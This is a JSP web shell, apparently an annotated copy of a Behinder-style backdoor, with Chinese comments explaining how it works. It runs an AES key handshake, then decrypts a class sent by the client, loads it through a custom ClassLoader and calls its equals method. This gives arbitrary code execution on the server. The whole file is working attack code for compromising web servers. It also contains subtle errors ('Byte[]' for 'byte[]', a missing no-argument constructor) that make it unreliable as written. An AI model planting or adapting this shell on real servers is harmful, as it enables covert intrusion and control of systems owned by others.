<%@ page import="java.util.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec"%>
<%@ page import="sun.misc.BASE64Decoder" %>
<%!
    /*
    定义ClassLoader的子类Myloader
    */
    public static class Myloader extends ClassLoader {
        public Myloader(ClassLoader c)
        {super(c);}
        public Class get(byte[] b) {  //定义get方法用来将指定的byte[]传给父类的defineClass
            return super.defineClass(b, 0, b.length);
        }
    }
%>
<%
    if (request.getParameter("pass")!=null) {  //判断请求方法是不是带密码的握手请求，此处只用参数名作为密码，参数值可以任意指定
        String k = UUID.randomUUID().toString().replace("-", "").substring(0, 16);  //随机生成一个16字节的密钥
        request.getSession().setAttribute("uid", k); //将密钥写入当前会话的Session中
        out.print(k); //将密钥发送给客户端
        return; //执行流返回，握手请求时，只产生密钥，后续的代码不再执行
    }
    /*
    当请求为非握手请求时，执行下面的分支，准备解密数据并执行
    */
    String uploadString= request.getReader().readLine();//从request中取出客户端传过来的加密payload
    byte[] encryptedData= new BASE64Decoder().decodeBuffer(uploadString); //把payload进行base64解码
    Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding"); // 选择AES解密套件
    c.init(Cipher.DECRYPT_MODE,new SecretKeySpec(request.getSession().getAttribute("uid").toString().getBytes(), "AES")); //从Session中取出密钥
    Byte[] classData= c.doFinal(encryptedData);  //AES解密操作
    //通过ClassLoader的子类Myloader的get方法来间接调用defineClass方法，将客户端发来的二进制class字节数组解析成Class并实例化
    Object myLoader= new Myloader().get(classData).newInstance();
    //调用payload class的equals方法，我们在准备payload class的时候，将想要执行的目标代码封装到equals方法中即可，将执行结果通过equals中利用response对象返回。
    boolean result= myLoader.equals(pageContext);
%>